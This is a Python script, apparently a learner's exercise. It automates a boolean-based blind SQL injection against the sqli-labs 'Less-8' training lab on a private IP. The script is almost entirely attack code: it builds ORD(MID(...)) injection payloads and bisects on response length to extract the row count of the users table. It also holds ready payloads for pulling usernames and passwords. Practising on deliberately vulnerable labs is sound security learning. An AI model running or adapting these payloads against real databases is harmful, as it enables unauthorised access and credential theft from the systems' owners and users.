#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@文件    :sql_boolean_test.py
@说明    :
@时间    :2023/05/30 09:49:16
@作者    :Lion
@版本    :1.0
'''

import requests
import logging

logging.basicConfig(level=logging.INFO,format='%(asctime)s - %(levelname)s: %(message)s')

test_url = "http://192.168.119.128/sqli-labs-master/Less-8/?id=1"
url = "http://192.168.119.128/sqli-labs-master/Less-8/"

username_payload = "1' AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM security.users ORDER BY password LIMIT 0,1),1,1))>64 AND 'mwgp'='mwgp"
passwd_payload = "1' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM security.users ORDER BY password LIMIT 0,1),1,1))>64 AND 'mwgp'='mwgp"

default_length = len(requests.get(url=test_url).text)

def test_url(i,mid):
    tables_conts_payload = "1' AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM security.users),{},1))>{} AND 'VJvK'='VJvK".format(i,mid)
    logging.info('payload is: %s'%tables_conts_payload)
    data = {'id':tables_conts_payload}
    html = requests.get(url=url,params=data)
    return len(html.text)

def bisection_method(i,l,r):
    on = False
    while l<r:
        mid = (l+r)//2
        test_length = test_url(i,mid)
        if test_length == default_length:
            l = mid
        else:
            r = mid
        if r == l +1:
            if test_length == default_length:
                return chr(r)
                break
            else:
                if test_url(i,9) != default_length:
                    on = "off"
                    return on
                    break
                return chr(r)
                break

def burst_cont():
    cont_num = ""
    for i in range(1,10):
        l = 47
        r = 57
        get_num = bisection_method(i,l,r)
        if get_num == "off":
            break
        cont_num += get_num
    logging.info("字段总数：%s"%cont_num)


def main():
    burst_cont()
            

if __name__ == "__main__":
    main()